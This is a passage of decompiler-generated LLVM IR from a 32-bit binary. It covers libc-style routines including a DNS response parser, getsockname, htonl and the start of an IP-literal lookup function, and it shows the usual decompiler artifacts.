  %v3_8050294 = zext i8 %v2_8050294 to i32
  store i32 %v3_8050294, i32* %edx.global-to-local, align 4
  %v0_8050297 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8050299 = add i32 %v0_8050299, 1
  store i32 %v1_8050299, i32* %ecx.global-to-local, align 4
  %v2_805029a = sub i32 %v0_8050297, %v1_8050299
  store i32 %v2_805029a, i32* %eax.global-to-local, align 4
  %v2_805029c = sub i32 %v3_8050294, %v2_805029a
  %v10_805029c = and i32 %v2_805029c, %v2_805029a
  %v11_805029c = icmp slt i32 %v10_805029c, 0
  %v13_805029c = icmp slt i32 %v2_805029c, 0
  store i1 %v13_805029c, i1* %sf.global-to-local, align 1
  %v2_805029e = icmp eq i1 %v13_805029c, %v11_805029c
  br i1 %v2_805029e, label %dec_label_pc_80502d6, label %dec_label_pc_80502a0

dec_label_pc_80502a0:                             ; preds = %dec_label_pc_8050294
  %v2_80502a4 = sub i32 %v6_8050231, %v1_80502a4
  store i32 %v2_80502a4, i32* %eax.global-to-local, align 4
  %v2_80502a6 = sub i32 %v3_8050294, %v2_80502a4
  %v10_80502a6 = and i32 %v2_80502a6, %v2_80502a4
  %v11_80502a6 = icmp slt i32 %v10_80502a6, 0
  %v13_80502a6 = icmp slt i32 %v2_80502a6, 0
  store i1 %v13_80502a6, i1* %sf.global-to-local, align 1
  %v2_80502a8 = icmp eq i1 %v13_80502a6, %v11_80502a6
  br i1 %v2_80502a8, label %dec_label_pc_80502d6, label %dec_label_pc_80502b2.preheader

dec_label_pc_80502b2.preheader:                   ; preds = %dec_label_pc_80502a0
  %v1_80502b230 = add nsw i32 %v3_8050294, -1
  store i32 %v1_80502b230, i32* %edx.global-to-local, align 4
  %v10_80502b336 = icmp eq i8 %v2_8050294, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_80502b637 = icmp eq i1 %v10_80502b336, false
  br i1 %v1_80502b637, label %dec_label_pc_80502ac, label %dec_label_pc_80502ca.loopexit

dec_label_pc_80502ac:                             ; preds = %dec_label_pc_80502b2.preheader, %dec_label_pc_80502ac.dec_label_pc_80502ac_crit_edge
  %v4_80502ac = phi i32 [ %v4_80502ac.pre, %dec_label_pc_80502ac.dec_label_pc_80502ac_crit_edge ], [ %v2_80502a4, %dec_label_pc_80502b2.preheader ]
  %v0_80502ac = phi i32 [ %v0_80502ac.pre, %dec_label_pc_80502ac.dec_label_pc_80502ac_crit_edge ], [ %v1_8050299, %dec_label_pc_80502b2.preheader ]
  %v2_80502af38 = phi i32 [ %v1_80502b1, %dec_label_pc_80502ac.dec_label_pc_80502ac_crit_edge ], [ %v1_80502a4, %dec_label_pc_80502b2.preheader ]
  %v1_80502ac = inttoptr i32 %v0_80502ac to i8*
  %v2_80502ac = load i8, i8* %v1_80502ac, align 1
  %v3_80502ac = zext i8 %v2_80502ac to i32
  %v5_80502ac = and i32 %v4_80502ac, -256
  %v6_80502ac = or i32 %v5_80502ac, %v3_80502ac
  store i32 %v6_80502ac, i32* %eax.global-to-local, align 4
  %v1_80502ae = add i32 %v0_80502ac, 1
  store i32 %v1_80502ae, i32* %ecx.global-to-local, align 4
  %v3_80502af = inttoptr i32 %v2_80502af38 to i8*
  store i8 %v2_80502ac, i8* %v3_80502af, align 1
  %v0_80502b1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80502b1 = add i32 %v0_80502b1, 1
  store i32 %v1_80502b1, i32* %ebx.global-to-local, align 4
  %v0_80502b2.pre = load i32, i32* %edx.global-to-local, align 4
  %v1_80502b2 = add i32 %v0_80502b2.pre, -1
  store i32 %v1_80502b2, i32* %edx.global-to-local, align 4
  %v10_80502b3 = icmp eq i32 %v0_80502b2.pre, 0
  %v11_80502b3 = icmp slt i32 %v0_80502b2.pre, 0
  store i1 %v11_80502b3, i1* %sf.global-to-local, align 1
  %v1_80502b6 = icmp eq i1 %v10_80502b3, false
  br i1 %v1_80502b6, label %dec_label_pc_80502ac.dec_label_pc_80502ac_crit_edge, label %dec_label_pc_80502ca.loopexit

dec_label_pc_80502ac.dec_label_pc_80502ac_crit_edge: ; preds = %dec_label_pc_80502ac
  %v0_80502ac.pre = load i32, i32* %ecx.global-to-local, align 4
  %v4_80502ac.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80502ac

dec_label_pc_80502ba:                             ; preds = %dec_label_pc_8050286
  %v0_80502ba = load i32, i32* %esi.global-to-local, align 4
  %v2_80502ba = icmp slt i32 %v0_80502ba, 0
  store i1 %v2_80502ba, i1* %sf.global-to-local, align 1
  %v1_80502bc = inttoptr i32 %v0_80502bc47 to i8*
  store i8 0, i8* %v1_80502bc, align 1
  %v0_80502bf = load i1, i1* %sf.global-to-local, align 1
  %v1_80502bf = icmp eq i1 %v0_80502bf, false
  br i1 %v1_80502bf, label %dec_label_pc_80502ba.dec_label_pc_80502d9_crit_edge, label %dec_label_pc_80502c1

dec_label_pc_80502ba.dec_label_pc_80502d9_crit_edge: ; preds = %dec_label_pc_80502ba
  %v0_80502da.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80502d9

dec_label_pc_80502c1:                             ; preds = %dec_label_pc_80502ba
  %v0_80502c1 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80502c1 = add i32 %v0_80502c1, 1
  %v5_80502c4 = sub i32 %v1_80502c1, %arg3
  %v16_80502c4 = icmp slt i32 %v5_80502c4, 0
  store i1 %v16_80502c4, i1* %sf.global-to-local, align 1
  store i32 %v5_80502c4, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80502d9

dec_label_pc_80502ca.loopexit:                    ; preds = %dec_label_pc_80502ac, %dec_label_pc_80502b2.preheader
  %v2_80502af.lcssa = phi i32 [ %v1_80502a4, %dec_label_pc_80502b2.preheader ], [ %v1_80502b1, %dec_label_pc_80502ac ]
  %v0_80502ca.pre = load i32, i32* %edi.global-to-local, align 4
  %v3_80502cd.pre.pre = load i8*, i8** %stack_var_-24, align 4
  br label %dec_label_pc_80502ca

dec_label_pc_80502ca:                             ; preds = %dec_label_pc_80502ca.loopexit, %dec_label_pc_805027e
  %v3_80502cd.pre = phi i8* [ %v3_80502cd.pre.pre, %dec_label_pc_80502ca.loopexit ], [ %v3_805027948, %dec_label_pc_805027e ]
  %v0_80502ca = phi i32 [ %v0_80502ca.pre, %dec_label_pc_80502ca.loopexit ], [ %v0_80502cd49, %dec_label_pc_805027e ]
  %v0_805028a7 = phi i32 [ %v2_80502af.lcssa, %dec_label_pc_80502ca.loopexit ], [ %v0_80502bc47, %dec_label_pc_805027e ]
  %v1_80502ca = add i32 %v0_80502ca, 2
  store i32 %v1_80502ca, i32* %edi.global-to-local, align 4
  %v4_80502cd = ptrtoint i8* %v3_80502cd.pre to i32
  %v5_80502cd = inttoptr i32 %v1_80502ca to i8*
  %v7_80502cd = sub i32 %v1_80502ca, %v4_80502cd
  %v18_80502cd = icmp slt i32 %v7_80502cd, 0
  store i1 %v18_80502cd, i1* %sf.global-to-local, align 1
  %v7_80502d0 = icmp slt i8* %v5_80502cd, %v3_80502cd.pre
  br i1 %v7_80502d0, label %dec_label_pc_80502ca.dec_label_pc_8050251_crit_edge, label %dec_label_pc_80502d6

dec_label_pc_80502ca.dec_label_pc_8050251_crit_edge: ; preds = %dec_label_pc_80502ca
  %v0_8050251.pre = load i32, i32* %ecx.global-to-local, align 4
  %v4_8050251.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050251

dec_label_pc_80502d6:                             ; preds = %dec_label_pc_8050231, %dec_label_pc_80502ca, %dec_label_pc_805025b, %dec_label_pc_8050279, %dec_label_pc_8050294, %dec_label_pc_80502a0, %dec_label_pc_805021d, %entry
  %stack_var_-20.0 = phi i8* [ %tmp21, %entry ], [ %tmp21, %dec_label_pc_805021d ], [ %v5_8050242, %dec_label_pc_80502a0 ], [ %v5_8050242, %dec_label_pc_8050294 ], [ %v5_8050242, %dec_label_pc_8050279 ], [ %v5_8050242, %dec_label_pc_805025b ], [ %v5_8050242, %dec_label_pc_80502ca ], [ %v5_8050242, %dec_label_pc_8050231 ]
  store i1 true, i1* %sf.global-to-local, align 1
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80502d9

dec_label_pc_80502d9:                             ; preds = %dec_label_pc_80502ba.dec_label_pc_80502d9_crit_edge, %dec_label_pc_80502c1, %dec_label_pc_80502d6
  %stack_var_-20.1 = phi i8* [ %stack_var_-20.0, %dec_label_pc_80502d6 ], [ %v5_8050242, %dec_label_pc_80502ba.dec_label_pc_80502d9_crit_edge ], [ %v5_8050242, %dec_label_pc_80502c1 ]
  %v0_80502da = phi i32 [ -1, %dec_label_pc_80502d6 ], [ %v0_80502da.pre, %dec_label_pc_80502ba.dec_label_pc_80502d9_crit_edge ], [ %v5_80502c4, %dec_label_pc_80502c1 ]
  %v2_80502d9 = load i8*, i8** %stack_var_-24, align 4
  %v3_80502d9 = ptrtoint i8* %v2_80502d9 to i32
  store i32 %v3_80502d9, i32* %edx.global-to-local, align 4
  store i32 %v0_80502da, i32* %eax.global-to-local, align 4
  %v3_80502dc = ptrtoint i8* %stack_var_-20.1 to i32
  store i32 %v3_80502dc, i32* %ecx.global-to-local, align 4
  ret i32 %v0_80502da

; uselistorder directives
  uselistorder i32 %v0_80502da, { 1, 0 }
  uselistorder i32 %v4_80502cd, { 1, 0 }
  uselistorder i32 %v1_80502ca, { 1, 0, 3, 2 }
  uselistorder i32 %v1_80502b1, { 0, 2, 1 }
  uselistorder i32 %v0_80502ac, { 1, 0 }
  uselistorder i32 %v2_80502a6, { 1, 0 }
  uselistorder i32 %v2_805029c, { 1, 0 }
  uselistorder i32 %v5_8050279, { 1, 0 }
  uselistorder i32 %v3_8050251, { 0, 2, 1 }
  uselistorder i8 %v2_8050251, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80502bc47, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v0_8050251, { 3, 2, 1, 0 }
  uselistorder i32 %v4_80502cd50, { 1, 0 }
  uselistorder i32 %v6_8050248, { 2, 0, 1, 3, 4, 5 }
  uselistorder i8* %v5_8050242, { 6, 7, 0, 1, 2, 3, 4, 5 }
  uselistorder i8** %stack_var_-24, { 2, 0, 1 }
  uselistorder i1* %sf.global-to-local, { 1, 17, 2, 3, 4, 5, 0, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 21, 18, 19, 20 }
  uselistorder i32* %esi.global-to-local, { 0, 1, 3, 4, 2, 5, 6 }
  uselistorder i32* %edx.global-to-local, { 1, 3, 2, 0, 4, 5, 6 }
  uselistorder i32* %ecx.global-to-local, { 0, 4, 7, 1, 2, 3, 6, 5, 8 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 5, 1, 2, 3, 4, 6, 8, 7, 9, 10, 11 }
  uselistorder i32 %arg5, { 1, 3, 2, 0, 5, 4 }
  uselistorder i32 %arg4, { 2, 0, 3, 1 }
  uselistorder i32 %arg3, { 4, 3, 0, 2, 1 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80502d9, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80502d6, { 1, 5, 4, 3, 2, 0, 6, 7 }
  uselistorder label %dec_label_pc_80502ac, { 1, 0 }
  uselistorder label %dec_label_pc_8050294, { 1, 0 }
  uselistorder label %dec_label_pc_8050279, { 1, 0 }
  uselistorder label %dec_label_pc_8050231, { 1, 0 }
}

define i32 @__dns_parse(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v7_80502f4 = icmp sgt i32 %arg2, 11
  br i1 %v7_80502f4, label %dec_label_pc_80502fa, label %dec_label_pc_805040a

dec_label_pc_80502fa:                             ; preds = %entry
  %v1_80502fa = add i32 %arg1, 3
  %v2_80502fa = inttoptr i32 %v1_80502fa to i8*
  %v3_80502fa = load i8, i8* %v2_80502fa, align 1
  %v4_80502fa = urem i8 %v3_80502fa, 16
  %v5_80502fa = icmp eq i8 %v4_80502fa, 0
  %v1_80502fe = icmp eq i1 %v5_80502fa, false
  br i1 %v1_80502fe, label %dec_label_pc_805040a, label %dec_label_pc_8050304

dec_label_pc_8050304:                             ; preds = %dec_label_pc_80502fa
  %v1_8050304 = add i32 %arg1, 4
  %v2_8050304 = inttoptr i32 %v1_8050304 to i8*
  %v3_8050304 = load i8, i8* %v2_8050304, align 1
  %v4_8050304 = zext i8 %v3_8050304 to i32
  %v1_8050308 = add i32 %arg1, 5
  %v2_8050308 = inttoptr i32 %v1_8050308 to i8*
  %v3_8050308 = load i8, i8* %v2_8050308, align 1
  %v4_8050308 = zext i8 %v3_8050308 to i32
  %v2_805030c = mul nuw nsw i32 %v4_8050304, 256
  %v2_805030f = or i32 %v4_8050308, %v2_805030c
  store i32 %v2_805030f, i32* %ebx.global-to-local, align 4
  %v1_8050312 = add i32 %arg1, 6
  %v2_8050312 = inttoptr i32 %v1_8050312 to i8*
  %v3_8050312 = load i8, i8* %v2_8050312, align 1
  %v4_8050312 = zext i8 %v3_8050312 to i32
  %v1_8050316 = add i32 %arg1, 7
  %v2_8050316 = inttoptr i32 %v1_8050316 to i8*
  %v3_8050316 = load i8, i8* %v2_8050316, align 1
  %v4_8050316 = zext i8 %v3_8050316 to i32
  %v2_805031a = mul nuw nsw i32 %v4_8050312, 256
  %v2_805031d = or i32 %v4_8050316, %v2_805031a
  store i32 %v2_805031d, i32* %ebp.global-to-local, align 4
  %v2_8050320 = add nuw nsw i32 %v2_805031d, %v2_805030f
  %tmp134 = icmp ult i32 %v2_8050320, 65
  %tmp47 = icmp eq i1 %tmp134, false
  br i1 %tmp47, label %dec_label_pc_805040a, label %dec_label_pc_805032d

dec_label_pc_805032d:                             ; preds = %dec_label_pc_8050304
  %v1_8050331 = add i32 %arg1, 12
  %v2_8050334 = add i32 %arg1, -6
  %v3_8050334 = add i32 %v2_8050334, %arg2
  store i32 %v3_8050334, i32* %esi.global-to-local, align 4
  %v1_8050371109 = add nsw i32 %v2_805030f, -1
  store i32 %v1_8050371109, i32* %ebx.global-to-local, align 4
  %v10_8050372115 = icmp eq i32 %v2_805030f, 0
  br i1 %v10_8050372115, label %dec_label_pc_80503e3, label %dec_label_pc_8050377

dec_label_pc_805033a:                             ; preds = %dec_label_pc_8050341
  %v1_805033a = add i32 %v0_805033a100, 1
  %v5_805033f = icmp slt i32 %v1_8050344, %arg2
  %v1_8050341 = inttoptr i32 %v1_805033a to i8*
  br i1 %v5_805033f, label %dec_label_pc_8050341, label %dec_label_pc_805034b

dec_label_pc_8050341:                             ; preds = %dec_label_pc_8050377, %dec_label_pc_805033a
  %v1_8050341102 = phi i8* [ %v1_8050341, %dec_label_pc_805033a ], [ %v1_805034199, %dec_label_pc_8050377 ]
  %v0_8050344101 = phi i32 [ %v1_8050344, %dec_label_pc_805033a ], [ %v2_8050379, %dec_label_pc_8050377 ]
  %v0_805033a100 = phi i32 [ %v1_805033a, %dec_label_pc_805033a ], [ %v0_8050377117, %dec_label_pc_8050377 ]
  %v2_8050341 = load i8, i8* %v1_8050341102, align 1
  %v3_8050341 = zext i8 %v2_8050341 to i32
  %v1_8050344 = add nsw i32 %v0_8050344101, 1
  store i32 %v1_8050344, i32* @ecx, align 4
  %v1_8050345 = add nsw i32 %v3_8050341, -1
  %v5_8050346 = icmp ult i32 %v1_8050345, 126
  %v9_8050346 = icmp eq i8 %v2_8050341, 127
  %v2_8050349 = or i1 %v9_8050346, %v5_8050346
  br i1 %v2_8050349, label %dec_label_pc_805033a, label %dec_label_pc_805034b

dec_label_pc_805034b:                             ; preds = %dec_label_pc_8050341, %dec_label_pc_805033a, %dec_label_pc_8050377
  %v0_805033a.lcssa = phi i32 [ %v0_8050377117, %dec_label_pc_8050377 ], [ %v1_805033a, %dec_label_pc_805033a ], [ %v0_805033a100, %dec_label_pc_8050341 ]
  %v1_8050341.lcssa = phi i8* [ %v1_805034199, %dec_label_pc_8050377 ], [ %v1_8050341, %dec_label_pc_805033a ], [ %v1_8050341102, %dec_label_pc_8050341 ]
  %v2_805034b = load i8, i8* %v1_8050341.lcssa, align 1
  %v8_805034f = icmp ugt i8 %v2_805034b, -63
  br i1 %v8_805034f, label %dec_label_pc_805040a, label %dec_label_pc_8050355

dec_label_pc_8050355:                             ; preds = %dec_label_pc_805034b
  %v12_805034d = icmp eq i8 %v2_805034b, -63
  %v1_8050355 = icmp eq i1 %v12_805034d, false
  br i1 %v1_8050355, label %dec_label_pc_8050361, label %dec_label_pc_8050357

dec_label_pc_8050357:                             ; preds = %dec_label_pc_8050355
  %v1_8050357 = add i32 %v0_805033a.lcssa, 1
  %v2_8050357 = inttoptr i32 %v1_8050357 to i8*
  %v3_8050357 = load i8, i8* %v2_8050357, align 1
  %v13_8050357 = icmp eq i8 %v3_8050357, -1
  br i1 %v13_8050357, label %dec_label_pc_805040a, label %dec_label_pc_8050361

dec_label_pc_8050361:                             ; preds = %dec_label_pc_8050357, %dec_label_pc_8050355
  %v6_8050363 = icmp ugt i32 %v0_805033a.lcssa, %v3_8050334
  br i1 %v6_8050363, label %dec_label_pc_805040a, label %dec_label_pc_8050369

dec_label_pc_8050369:                             ; preds = %dec_label_pc_8050361
  %v6_8050369 = icmp eq i8 %v2_805034b, 0
  %v2_805036d = select i1 %v6_8050369, i32 7, i32 6
  %v3_805036d = add i32 %v2_805036d, %v0_805033a.lcssa
  %v1_8050371 = add i32 %v1_8050371118, -1
  store i32 %v1_8050371, i32* %ebx.global-to-local, align 4
  %v10_8050372 = icmp eq i32 %v1_8050371118, 0
  br i1 %v10_8050372, label %dec_label_pc_80503e3, label %dec_label_pc_8050377

dec_label_pc_8050377:                             ; preds = %dec_label_pc_805032d, %dec_label_pc_8050369
  %v1_8050371118 = phi i32 [ %v1_8050371, %dec_label_pc_8050369 ], [ %v1_8050371109, %dec_label_pc_805032d ]
  %v0_8050377117 = phi i32 [ %v3_805036d, %dec_label_pc_8050369 ], [ %v1_8050331, %dec_label_pc_805032d ]
  %v2_8050379 = sub i32 %v0_8050377117, %arg1
  store i32 %v2_8050379, i32* @ecx, align 4
  %v5_805033f98 = icmp slt i32 %v2_8050379, %arg2
  %v1_805034199 = inttoptr i32 %v0_8050377117 to i8*
  br i1 %v5_805033f98, label %dec_label_pc_8050341, label %dec_label_pc_805034b

dec_label_pc_805037d:                             ; preds = %dec_label_pc_8050384
  %v1_805037d = add i32 %v0_80503a660, 1
  %v5_805037e = sub i32 %v1_8050387, %arg2
  %v11_805037e = xor i32 %v1_8050387, %arg2
  %v12_805037e = xor i32 %v5_805037e, %v1_8050387
  %v13_805037e = and i32 %v12_805037e, %v11_805037e
  %v14_805037e = icmp slt i32 %v13_805037e, 0
  %v16_805037e = icmp slt i32 %v5_805037e, 0
  %v2_8050382 = icmp eq i1 %v16_805037e, %v14_805037e
  %.pre = inttoptr i32 %v1_805037d to i8*
  br i1 %v2_8050382, label %dec_label_pc_805038e, label %dec_label_pc_8050384

dec_label_pc_8050384:                             ; preds = %dec_label_pc_80503fa, %dec_label_pc_805037d
  %.pre62 = phi i8* [ %.pre, %dec_label_pc_805037d ], [ %.pre59, %dec_label_pc_80503fa ]
  %v0_805038761 = phi i32 [ %v1_8050387, %dec_label_pc_805037d ], [ %v2_80503fc, %dec_label_pc_80503fa ]
  %v0_80503a660 = phi i32 [ %v1_805037d, %dec_label_pc_805037d ], [ %v0_80503fa77, %dec_label_pc_80503fa ]
  %v2_8050384 = load i8, i8* %.pre62, align 1
  %v3_8050384 = zext i8 %v2_8050384 to i32
  %v1_8050387 = add i32 %v0_805038761, 1
  store i32 %v1_8050387, i32* @ecx, align 4
  %v1_8050388 = add nsw i32 %v3_8050384, -1
  %v5_8050389 = icmp ult i32 %v1_8050388, 126
  %v9_8050389 = icmp eq i8 %v2_8050384, 127
  %v2_805038c = or i1 %v9_8050389, %v5_8050389
  br i1 %v2_805038c, label %dec_label_pc_805037d, label %dec_label_pc_805038e

dec_label_pc_805038e:                             ; preds = %dec_label_pc_8050384, %dec_label_pc_805037d, %dec_label_pc_80503fa
  %v0_80503a6.lcssa = phi i32 [ %v0_80503fa77, %dec_label_pc_80503fa ], [ %v1_805037d, %dec_label_pc_805037d ], [ %v0_80503a660, %dec_label_pc_8050384 ]
  %.pre.lcssa = phi i8* [ %.pre59, %dec_label_pc_80503fa ], [ %.pre, %dec_label_pc_805037d ], [ %.pre62, %dec_label_pc_8050384 ]
  %v2_805038e = load i8, i8* %.pre.lcssa, align 1
  %tmp = icmp ult i8 %v2_805038e, -62
  br i1 %tmp, label %dec_label_pc_8050394, label %dec_label_pc_805040a

dec_label_pc_8050394:                             ; preds = %dec_label_pc_805038e
  %v11_8050390 = icmp eq i8 %v2_805038e, -63
  %v1_8050394 = icmp eq i1 %v11_8050390, false
  br i1 %v1_8050394, label %dec_label_pc_805039c, label %dec_label_pc_8050396

dec_label_pc_8050396:                             ; preds = %dec_label_pc_8050394
  %v1_8050396 = add i32 %v0_80503a6.lcssa, 1
  %v2_8050396 = inttoptr i32 %v1_8050396 to i8*
  %v3_8050396 = load i8, i8* %v2_8050396, align 1
  %v13_8050396 = icmp eq i8 %v3_8050396, -1
  br i1 %v13_8050396, label %dec_label_pc_805040a, label %dec_label_pc_805039c

dec_label_pc_805039c:                             ; preds = %dec_label_pc_8050396, %dec_label_pc_8050394
  %v4_805039c = load i32, i32* %stack_var_-28, align 4
  %tmp135 = icmp ugt i32 %v0_80503a6.lcssa, %v4_805039c
  br i1 %tmp135, label %dec_label_pc_805040a, label %dec_label_pc_80503a2

dec_label_pc_80503a2:                             ; preds = %dec_label_pc_805039c
  %v6_80503a2 = icmp eq i8 %v2_805038e, 0
  %v2_80503a6 = select i1 %v6_80503a2, i32 3, i32 2
  %v3_80503a6 = add i32 %v2_80503a6, %v0_80503a6.lcssa
  store i32 %v3_80503a6, i32* @ecx, align 4
  %v1_80503aa = add i32 %v3_80503a6, 8
  %v2_80503aa = inttoptr i32 %v1_80503aa to i8*
  %v3_80503aa = load i8, i8* %v2_80503aa, align 1
  %v4_80503aa = zext i8 %v3_80503aa to i32
  %v1_80503ae = add i32 %v3_80503a6, 9
  %v2_80503ae = inttoptr i32 %v1_80503ae to i8*
  %v3_80503ae = load i8, i8* %v2_80503ae, align 1
  %v4_80503ae = zext i8 %v3_80503ae to i32
  %v2_80503b2 = mul nuw nsw i32 %v4_80503aa, 256
  %v2_80503b5 = or i32 %v4_80503ae, %v2_80503b2
  store i32 %v2_80503b5, i32* %ebx.global-to-local, align 4
  %v2_80503b8 = add i32 %v2_80503b5, %v3_80503a6
  %tmp136 = icmp ugt i32 %v2_80503b8, %v2_80503e7
  br i1 %tmp136, label %dec_label_pc_805040a, label %dec_label_pc_80503c1

dec_label_pc_80503c1:                             ; preds = %dec_label_pc_80503a2
  %v1_80503c6 = add i32 %v3_80503a6, 10
  store i32 %v1_80503c6, i32* %esi.global-to-local, align 4
  call void @__pseudo_call(i32 %arg2)
  br i1 false, label %dec_label_pc_805040a, label %dec_label_pc_80503de

dec_label_pc_80503de:                             ; preds = %dec_label_pc_80503c1
  %v0_80503de = load i32, i32* %esi.global-to-local, align 4
  %v1_80503de = load i32, i32* %ebx.global-to-local, align 4
  %v0_80503f4.pre = load i32, i32* %ebp.global-to-local, align 4
  %v1_80503f4 = add i32 %v0_80503f4.pre, -1
  store i32 %v1_80503f4, i32* %ebp.global-to-local, align 4
  %v10_80503f5 = icmp eq i32 %v0_80503f4.pre, 0
  br i1 %v10_80503f5, label %dec_label_pc_805040a, label %dec_label_pc_80503de.dec_label_pc_80503fa_crit_edge

dec_label_pc_80503de.dec_label_pc_80503fa_crit_edge: ; preds = %dec_label_pc_80503de
  %v2_80503de = add i32 %v1_80503de, %v0_80503de
  %v1_80503fc.pre = load i32, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80503fa

dec_label_pc_80503e3:                             ; preds = %dec_label_pc_8050369, %dec_label_pc_805032d
  %v0_8050377.lcssa = phi i32 [ %v1_8050331, %dec_label_pc_805032d ], [ %v3_805036d, %dec_label_pc_8050369 ]
  %v2_80503e7 = add i32 %arg2, %arg1
  %v1_80503f468 = add nsw i32 %v2_805031d, -1
  store i32 %v1_80503f468, i32* %ebp.global-to-local, align 4
  %v10_80503f574 = icmp eq i32 %v2_805031d, 0
  br i1 %v10_80503f574, label %dec_label_pc_805040a, label %dec_label_pc_80503fa

dec_label_pc_80503fa:                             ; preds = %dec_label_pc_80503e3, %dec_label_pc_80503de.dec_label_pc_80503fa_crit_edge
  %v1_80503fc = phi i32 [ %v1_80503fc.pre, %dec_label_pc_80503de.dec_label_pc_80503fa_crit_edge ], [ %arg1, %dec_label_pc_80503e3 ]
  %v0_80503fa77 = phi i32 [ %v2_80503de, %dec_label_pc_80503de.dec_label_pc_80503fa_crit_edge ], [ %v0_8050377.lcssa, %dec_label_pc_80503e3 ]
  %v2_80503fc = sub i32 %v0_80503fa77, %v1_80503fc
  store i32 %v2_80503fc, i32* @ecx, align 4
  %v5_805037e50 = sub i32 %v2_80503fc, %arg2
  %v11_805037e52 = xor i32 %v2_80503fc, %arg2
  %v12_805037e53 = xor i32 %v5_805037e50, %v2_80503fc
  %v13_805037e54 = and i32 %v12_805037e53, %v11_805037e52
  %v14_805037e55 = icmp slt i32 %v13_805037e54, 0
  %v16_805037e57 = icmp slt i32 %v5_805037e50, 0
  %v2_805038258 = icmp eq i1 %v16_805037e57, %v14_805037e55
  %.pre59 = inttoptr i32 %v0_80503fa77 to i8*
  br i1 %v2_805038258, label %dec_label_pc_805038e, label %dec_label_pc_8050384

dec_label_pc_805040a:                             ; preds = %dec_label_pc_80503a2, %dec_label_pc_805039c, %dec_label_pc_805034b, %dec_label_pc_8050357, %dec_label_pc_8050361, %dec_label_pc_80503e3, %dec_label_pc_805038e, %dec_label_pc_80503c1, %dec_label_pc_8050396, %dec_label_pc_80503de, %dec_label_pc_80502fa, %dec_label_pc_8050304, %entry
  %storemerge = phi i32 [ -1, %entry ], [ -1, %dec_label_pc_8050304 ], [ 0, %dec_label_pc_80502fa ], [ 0, %dec_label_pc_80503e3 ], [ -1, %dec_label_pc_80503a2 ], [ -1, %dec_label_pc_805039c ], [ -1, %dec_label_pc_805038e ], [ -1, %dec_label_pc_80503c1 ], [ -1, %dec_label_pc_8050396 ], [ 0, %dec_label_pc_80503de ], [ -1, %dec_label_pc_8050361 ], [ -1, %dec_label_pc_8050357 ], [ -1, %dec_label_pc_805034b ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_80503fc, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_80503fa77, { 3, 2, 0, 1 }
  uselistorder i32 %v3_80503a6, { 1, 0, 2, 3, 4 }
  uselistorder i8 %v2_805038e, { 2, 1, 0 }
  uselistorder i32 %v0_80503a6.lcssa, { 2, 0, 1 }
  uselistorder i32 %v1_8050387, { 4, 1, 2, 3, 0 }
  uselistorder i8* %.pre, { 1, 0 }
  uselistorder i32 %v5_805037e, { 1, 0 }
  uselistorder i32 %v1_805037d, { 1, 0, 2 }
  uselistorder i32 %v2_8050379, { 1, 2, 0 }
  uselistorder i32 %v0_8050377117, { 3, 2, 0, 1 }
  uselistorder i32 %v1_8050371118, { 1, 0 }
  uselistorder i8 %v2_805034b, { 1, 0, 2 }
  uselistorder i32 %v0_805033a.lcssa, { 2, 1, 0 }
  uselistorder i32 %v1_8050344, { 2, 1, 0 }
  uselistorder i8* %v1_8050341, { 1, 0 }
  uselistorder i32 %v1_805033a, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 4, 3 }
  uselistorder i32* %ebp.global-to-local, { 3, 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 2, 3, 9, 4, 8, 0, 6, 5, 7 }
  uselistorder i32 %arg1, { 0, 1, 3, 2, 4, 6, 5, 8, 7, 10, 9 }
  uselistorder label %dec_label_pc_805040a, { 5, 9, 7, 0, 1, 8, 6, 4, 3, 2, 11, 10, 12 }
  uselistorder label %dec_label_pc_805038e, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050377, { 1, 0 }
  uselistorder label %dec_label_pc_805034b, { 2, 0, 1 }
}

define i32 @getsockname(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 6, i32* @edx, align 4
  %v2_8050420 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8050420, i32* @ecx, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  store i32 102, i32* @eax, align 4
  %v1_8050455 = call i32 @__vsyscall(i32 %arg1)
  %v1_805045e = call i32 @__syscall_ret(i32 %v1_8050455)
  ret i32 %v1_805045e

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @htonl() local_unnamed_addr {
entry:
  %tmp = call i8 @__decompiler_undefined_function_4()
  %v4_8050468 = sext i8 %tmp to i32
  %v2_805048e = call i32 @llvm.bswap.i32(i32 %v4_8050468)
  ret i32 %v2_805048e
}

define i32 @__lookup_ipliteral(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp10 = call i8 @__decompiler_undefined_function_4()
  %tmp13 = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i8*, align 4
  %stack_var_-40 = alloca i8, align 1
